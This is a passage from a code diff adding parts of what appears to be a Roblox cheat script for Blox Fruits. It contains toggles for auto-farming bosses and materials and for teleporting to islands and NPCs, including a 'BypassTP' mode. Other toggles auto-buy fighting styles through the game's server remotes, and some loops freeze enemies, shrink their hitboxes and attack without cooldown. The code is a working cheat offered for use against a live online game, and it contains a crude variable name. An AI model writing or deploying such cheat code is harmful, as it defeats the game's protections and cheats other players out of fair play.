+							elseif not (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra") and ((CFrame.new((-26880.93359375), 22.848554611206, 473.18951416016)).Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 1000 then
+								topos(CFrame.new(-26880.93359375, 22.848554611206, 473.18951416016));
+							end;
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World2 then
+	ItemsTab:Toggle("Auto Farm Factory", _G.AutoFactory, false, function(value)
+		_G.AutoFactory = value;
+		StopTween(_G.AutoFactory);
+	end);
+	spawn(function()
+		while wait() do
+			pcall(function()
+				if _G.AutoFactory then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Core") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Core" and v.Humanoid.Health > 0 then
+								repeat
+									task.wait();
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									topos(CFrame.new(448.46756, 199.356781, -441.389252));
+									(game:GetService("VirtualUser")):CaptureController();
+									(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+								until v.Humanoid.Health <= 0 or _G.AutoFactory == false;
+							end;
+						end;
+					else
+						topos(CFrame.new(448.46756, 199.356781, -441.389252));
+					end;
+				end;
+			end);
+		end;
+	end);
+elseif World3 then
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if game.Workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island") then
+					Mirragecheck:Set("🏝️ Mirage Island is Spawning");
+					_G.MirageSpawn = true;
+				else
+					Mirragecheck:Set("🏝️ Mirage Island Not Spawn");
+					_G.MirageSpawn = false;
+				end;
+				if game.Workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island") then
+					Kitsunecheck:Set("⛩️ Kitsune Island is Spawning");
+					_G.KitsuneSpawn = true;
+				else
+					Kitsunecheck:Set("⛩️ Kitsune Island Not Spawn");
+					_G.KitsuneSpawn = false;
+				end;
+			end;
+		end);
+	end);
+	SeaTab:Seperator("Mirage Island");
+	Mirragecheck = SeaTab:Label("Mirage Island");
+	SeaTab:Toggle("Teleport To Mirage Island", _G.AutoMysticIsland, "Tween To Mirage Island", function(value)
+		_G.AutoMysticIsland = value;
+		StopTween(_G.AutoMysticIsland);
+	end);
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if _G.AutoMysticIsland then
+					if (game:GetService("Workspace")).Map:FindFirstChild("MysticIsland") then
+						topos(CFrame.new((game:GetService("Workspace")).Map.MysticIsland.Center.Position.X, 500, (game:GetService("Workspace")).Map.MysticIsland.Center.Position.Z));
+					end;
+				end;
+			end;
+		end);
+	end);
+	SeaTab:Toggle("Teleport Advanced Fruit Dealer", _G.TPNPC, "Tween To Advanced Fruit Dealer", function(value)
+		_G.Miragenpc = value;
+		StopTween(_G.Miragenpc);
+	end);
+	SeaTab:Seperator("Kitsune Island");
+	Kitsunecheck = SeaTab:Label("Kitsune Island");
+	SeaTab:Toggle("Teleport To Kitsune Island", _G.TeleportKitsune, "Tween To Kitsune Island", function(value)
+		_G.TeleportKitsune = value;
+		StopTween(_G.TeleportKitsune);
+	end);
+	spawn(function()
+		while wait() do
+			if _G.TeleportKitsune then
+				if (game:GetService("Workspace")).Map:FindFirstChild("KitsuneIsland") then
+					topos(game.Workspace.Map.KitsuneIsland.ShrineActive.NeonShrinePart.CFrame * CFrame.new(0, 0, 10));
+				end;
+			end;
+		end;
+	end);
+	SeaTab:Toggle("Auto Collect Azure", _G.CollectAzure, "Tween To Azure Ember", function(value)
+		_G.CollectAzure = value;
+	end);
+	spawn(function()
+		while wait() do
+			if _G.CollectAzure then
+				pcall(function()
+					if (game:GetService("Workspace")):FindFirstChild("AttachedAzureEmber") then
+						fastpos((((game:GetService("Workspace")):WaitForChild("EmberTemplate")):FindFirstChild("Part")).CFrame);
+					end;
+				end);
+			end;
+		end;
+	end);
+	_G.SetToTradeAureEmber = 20;
+	SeaTab:Slider("Set Azure Ember", 10, 25, _G.SetToTradeAureEmber, function(v)
+		_G.SetToTradeAureEmber = v;
+	end);
+	SeaTab:Toggle("Auto Trade Azure Ember", false, "Trade Azure Ember", function(state)
+		_G.TradeAureEmber = state;
+	end);
+	function GetCountMaterials(MaterialName)
+		local Inventory = (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("getInventory");
+		for i, v in pairs(Inventory) do
+			if v.Name == MaterialName then
+				return v.Count;
+			end;
+		end;
+	end;
+	spawn(function()
+		while wait() do
+			if _G.TradeAureEmber then
+				pcall(function()
+					local AzureAvilable = GetCountMaterials("Azure Ember");
+					if AzureAvilable >= _G.SetToTradeAureEmber then
+						((game:GetService("ReplicatedStorage")).Modules.Net:FindFirstChild("RF/KitsuneStatuePray")):InvokeServer();
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("KitsuneStatuePray");
+					end;
+				end);
+			end;
+		end;
+	end);
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if _G.Miragenpc then
+					if (game:GetService("Workspace")).NPCs:FindFirstChild("Advanced Fruit Dealer") then
+						topos(CFrame.new((game:GetService("Workspace")).NPCs["Advanced Fruit Dealer"].HumanoidRootPart.Position));
+					end;
+				end;
+			end;
+		end);
+	end);
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if _G.TweenMGear then
+					if (game:GetService("Workspace")).Map:FindFirstChild("MysticIsland") then
+						for i, v in pairs((game:GetService("Workspace")).Map.MysticIsland:GetChildren()) do
+							if v:IsA("MeshPart") then
+								if v.Material == Enum.Material.Neon then
+									topos(v.CFrame);
+								end;
+							end;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end);
+end;
+ItemsTab:Seperator("Fighting Style");
+ItemsTab:Toggle("Auto Superhuman", _G.AutoSuperhuman, false, function(value)
+	_G.AutoSuperhuman = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoSuperhuman then
+				if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") or game.Players.LocalPlayer.Character:FindFirstChild("Combat") and (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 150000 then
+					UnEquipWeapon("Combat");
+					wait(0.1);
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBlackLeg");
+				end;
+				if game.Players.LocalPlayer.Character:FindFirstChild("Superhuman") or game.Players.LocalPlayer.Backpack:FindFirstChild("Superhuman") then
+					_G.SelectWeapon = "Superhuman";
+				end;
+				if game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") or game.Players.LocalPlayer.Character:FindFirstChild("Black Leg") or game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") or game.Players.LocalPlayer.Character:FindFirstChild("Electro") or game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") or game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate") or game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw") or game.Players.LocalPlayer.Character:FindFirstChild("Dragon Claw") then
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg")).Level.Value <= 299 then
+						_G.SelectWeapon = "Black Leg";
+					end;
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value <= 299 then
+						_G.SelectWeapon = "Electro";
+					end;
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate")).Level.Value <= 299 then
+						_G.SelectWeapon = "Fishman Karate";
+					end;
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw")).Level.Value <= 299 then
+						_G.SelectWeapon = "Dragon Claw";
+					end;
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg")).Level.Value >= 300 and (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 300000 then
+						UnEquipWeapon("Black Leg");
+						wait(0.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectro");
+					end;
+					if game.Players.LocalPlayer.Character:FindFirstChild("Black Leg") and (game.Players.LocalPlayer.Character:FindFirstChild("Black Leg")).Level.Value >= 300 and (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 300000 then
+						UnEquipWeapon("Black Leg");
+						wait(0.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectro");
+					end;
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value >= 300 and (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 750000 then
+						UnEquipWeapon("Electro");
+						wait(0.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyFishmanKarate");
+					end;
+					if game.Players.LocalPlayer.Character:FindFirstChild("Electro") and (game.Players.LocalPlayer.Character:FindFirstChild("Electro")).Level.Value >= 300 and (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 750000 then
+						UnEquipWeapon("Electro");
+						wait(0.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyFishmanKarate");
+					end;
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate")).Level.Value >= 300 and (game:GetService("Players")).Localplayer.Data.Fragments.Value >= 1500 then
+						UnEquipWeapon("Fishman Karate");
+						wait(0.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1");
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2");
+					end;
+					if game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate") and (game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate")).Level.Value >= 300 and (game:GetService("Players")).Localplayer.Data.Fragments.Value >= 1500 then
+						UnEquipWeapon("Fishman Karate");
+						wait(0.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1");
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2");
+					end;
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw")).Level.Value >= 300 and (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 3000000 then
+						UnEquipWeapon("Dragon Claw");
+						wait(0.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman");
+					end;
+					if game.Players.LocalPlayer.Character:FindFirstChild("Dragon Claw") and (game.Players.LocalPlayer.Character:FindFirstChild("Dragon Claw")).Level.Value >= 300 and (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 3000000 then
+						UnEquipWeapon("Dragon Claw");
+						wait(0.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman");
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+ItemsTab:Toggle("Auto DeathStep", _G.AutoDeathStep, false, function(value)
+	_G.AutoDeathStep = value;
+end);
+spawn(function()
+	while wait() do
+		wait();
+		if _G.AutoDeathStep then
+			if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Black Leg") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Death Step") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Death Step") then
+				if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg") and ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg")).Level.Value >= 450 then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep");
+					_G.SelectWeapon = "Death Step";
+				end;
+				if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Black Leg") and ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Black Leg")).Level.Value >= 450 then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep");
+					_G.SelectWeapon = "Death Step";
+				end;
+				if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg") and ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg")).Level.Value <= 449 then
+					_G.SelectWeapon = "Black Leg";
+				end;
+			else
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBlackLeg");
+			end;
+		end;
+	end;
+end);
+ItemsTab:Toggle("Auto Sharkman Karate", _G.AutoSharkman, false, function(value)
+	_G.AutoSharkman = value;
+	StopTween(_G.AutoSharkman);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoSharkman then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyFishmanKarate");
+				if string.find((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate"), "keys") then
+					if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Water Key") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Water Key") then
+						topos(CFrame.new(-2604.6958, 239.432526, -10315.1982, 0.0425701365, 0, -0.999093413, 0, 1, 0, 0.999093413, 0, 0.0425701365));
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate");
+					elseif (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Fishman Karate") and ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Fishman Karate")).Level.Value >= 400 then
+					else
+						Ms = "Tide Keeper";
+						if (game:GetService("Workspace")).Enemies:FindFirstChild(Ms) then
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == Ms then
+									OldCFrameShark = v.HumanoidRootPart.CFrame;
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.Head.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.HumanoidRootPart.CanCollide = false;
+										v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+										v.HumanoidRootPart.CFrame = OldCFrameShark;
+										topos(v.HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+										AttackNoCD();
+									until not v.Parent or v.Humanoid.Health <= 0 or _G.AutoSharkman == false or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Water Key") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Water Key");
+								end;
+							end;
+						else
+							topos(CFrame.new(-3570.18652, 123.328949, -11555.9072, 0.465199202, -0.000000013857326, 0.885206044, 0.0000000040332897, 1, 0.0000000135347511, -0.885206044, -0.00000000272606271, 0.465199202));
+							wait(3);
+						end;
+					end;
+				else
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate");
+				end;
+			end;
+		end;
+	end);
+end);
+ItemsTab:Toggle("Auto Electric Claw", _G.AutoElectricClaw, false, function(value)
+	_G.AutoElectricClaw = value;
+	StopTween(_G.AutoElectricClaw);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoElectricClaw then
+				if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electric Claw") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electric Claw") then
+					if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") and ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value >= 400 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+						_G.SelectWeapon = "Electric Claw";
+					end;
+					if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") and ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro")).Level.Value >= 400 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+						_G.SelectWeapon = "Electric Claw";
+					end;
+					if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") and ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value <= 399 then
+						_G.SelectWeapon = "Electro";
+					end;
+				else
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectro");
+				end;
+			end;
+			if _G.AutoElectricClaw then
+				if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") then
+					if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") and ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value >= 400 or ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro")).Level.Value >= 400 then
+						if _G.AutoFarm == false then
+							repeat
+								task.wait();
+								topos(CFrame.new(-10371.4717, 330.764496, -10131.4199));
+							until not _G.AutoElectricClaw or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - (CFrame.new((-10371.4717), 330.764496, (-10131.4199))).Position).Magnitude <= 10;
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start");
+							wait(2);
+							repeat
+								task.wait();
+								topos(CFrame.new(-12550.532226563, 336.22631835938, -7510.4233398438));
+							until not _G.AutoElectricClaw or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - (CFrame.new((-12550.532226563), 336.22631835938, (-7510.4233398438))).Position).Magnitude <= 10;
+							wait(1);
+							repeat
+								task.wait();
+								topos(CFrame.new(-10371.4717, 330.764496, -10131.4199));
+							until not _G.AutoElectricClaw or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - (CFrame.new((-10371.4717), 330.764496, (-10131.4199))).Position).Magnitude <= 10;
+							wait(1);
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+						elseif _G.AutoFarm == true then
+							_G.AutoFarm = false;
+							wait(1);
+							repeat
+								task.wait();
+								topos(CFrame.new(-10371.4717, 330.764496, -10131.4199));
+							until not _G.AutoElectricClaw or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - (CFrame.new((-10371.4717), 330.764496, (-10131.4199))).Position).Magnitude <= 10;
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start");
+							wait(2);
+							repeat
+								task.wait();
+								topos(CFrame.new(-12550.532226563, 336.22631835938, -7510.4233398438));
+							until not _G.AutoElectricClaw or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - (CFrame.new((-12550.532226563), 336.22631835938, (-7510.4233398438))).Position).Magnitude <= 10;
+							wait(1);
+							repeat
+								task.wait();
+								topos(CFrame.new(-10371.4717, 330.764496, -10131.4199));
+							until not _G.AutoElectricClaw or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - (CFrame.new((-10371.4717), 330.764496, (-10131.4199))).Position).Magnitude <= 10;
+							wait(1);
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+							_G.SelectWeapon = "Electric Claw";
+							wait(0.1);
+							_G.AutoFarm = true;
+						end;
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+ItemsTab:Toggle("Auto Dragon Talon", _G.AutoDragonTalon, false, function(value)
+	_G.AutoDragonTalon = value;
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoDragonTalon then
+			if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Claw") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Talon") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Talon") then
+				if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw")).Level.Value >= 400 then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon");
+					_G.SelectWeapon = "Dragon Talon";
+				end;
+				if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Claw") and ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Claw")).Level.Value >= 400 then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon");
+					_G.SelectWeapon = "Dragon Talon";
+				end;
+				if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw")).Level.Value <= 399 then
+					_G.SelectWeapon = "Dragon Claw";
+				end;
+			else
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2");
+			end;
+		end;
+	end;
+end);
+ItemsTab:Toggle("Auto GodHuman", _G.Auto_God_Human, false, function(value)
+	_G.Auto_God_Human = value;
+end);
+spawn(function()
+	while task.wait() do
+		if _G.Auto_God_Human then
+			pcall(function()
+				if game.Players.LocalPlayer.Character:FindFirstChild("Superhuman") or game.Players.LocalPlayer.Backpack:FindFirstChild("Superhuman") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Black Leg") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Death Step") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Death Step") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Fishman Karate") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Fishman Karate") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Sharkman Karate") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Sharkman Karate") or game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") or game.Players.LocalPlayer.Character:FindFirstChild("Electro") or game.Players.LocalPlayer.Backpack:FindFirstChild("Electric Claw") or game.Players.LocalPlayer.Character:FindFirstChild("Electric Claw") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Claw") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Talon") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Talon") or game.Players.LocalPlayer.Character:FindFirstChild("Godhuman") or game.Players.LocalPlayer.Backpack:FindFirstChild("Godhuman") then
+					if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman", true) == 1 then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild("Superhuman") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Superhuman")).Level.Value >= 400 or game.Players.LocalPlayer.Character:FindFirstChild("Superhuman") and (game.Players.LocalPlayer.Character:FindFirstChild("Superhuman")).Level.Value >= 400 then
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep");
+						end;
+					else
+						Alert:create("Not Have Superhuman");
+					end;
+					if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep", true) == 1 then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild("Death Step") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Death Step")).Level.Value >= 400 or game.Players.LocalPlayer.Character:FindFirstChild("Death Step") and (game.Players.LocalPlayer.Character:FindFirstChild("Death Step")).Level.Value >= 400 then
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate");
+						end;
+					else
+						Alert:create("Not Have Death Step");
+					end;
+					if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate", true) == 1 then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild("Sharkman Karate") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Sharkman Karate")).Level.Value >= 400 or game.Players.LocalPlayer.Character:FindFirstChild("Sharkman Karate") and (game.Players.LocalPlayer.Character:FindFirstChild("Sharkman Karate")).Level.Value >= 400 then
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+						end;
+					else
+						Alert:create("Not Have Sharkman Karate");
+					end;
+					if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw", true) == 1 then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild("Electric Claw") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Electric Claw")).Level.Value >= 400 or game.Players.LocalPlayer.Character:FindFirstChild("Electric Claw") and (game.Players.LocalPlayer.Character:FindFirstChild("Electric Claw")).Level.Value >= 400 then
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon");
+						end;
+					else
+						Alert:create("Not Have Electric Claw");
+					end;
+					if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon", true) == 1 then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Talon") and (game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Talon")).Level.Value >= 400 or game.Players.LocalPlayer.Character:FindFirstChild("Dragon Talon") and (game.Players.LocalPlayer.Character:FindFirstChild("Dragon Talon")).Level.Value >= 400 then
+							if string.find((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyGodhuman", true), "Bring") then
+								Alert:create("Not Have Enough Material");
+							else
+								(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyGodhuman");
+							end;
+						end;
+					else
+						Alert:create("Not Have Dragon Talon");
+					end;
+				else
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman");
+				end;
+			end);
+		end;
+	end;
+end);
+ItemsTab:Seperator("Materials");
+if World2 then
+	ItemsTab:Toggle("Auto Farm Radioactive Material", false, false, function(value)
+		Radioactive = value;
+		StopTween(Radioactive);
+	end);
+	local MaterialsPos1 = CFrame.new(-507.7895202636719, 72.99479675292969, -126.45632934570312);
+	spawn(function()
+		while wait() do
+			if Radioactive and World2 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Factory Staff") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Factory Staff" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										AttackNoCD();
+									until not Radioactive or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos1.Position).Magnitude > 1500 then
+								BTP(MaterialsPos1);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos1.Position).Magnitude < 1500 then
+								topos(MaterialsPos1);
+							end;
+						else
+							topos(MaterialsPos1);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-507.7895202636719, 72.99479675292969, -126.45632934570312));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Factory Staff") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Factory Staff")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World2 then
+	ItemsTab:Toggle("Auto Farm Mystic Droplet", false, false, function(value)
+		_G.Makori_gay = value;
+		StopTween(_G.Makori_gay);
+	end);
+	local MaterialsPos2 = CFrame.new(-3352.9013671875, 285.01556396484375, -10534.841796875);
+	spawn(function()
+		while wait() do
+			if _G.Makori_gay and World2 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Water Fighter") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Water Fighter" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not _G.Makori_gay or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
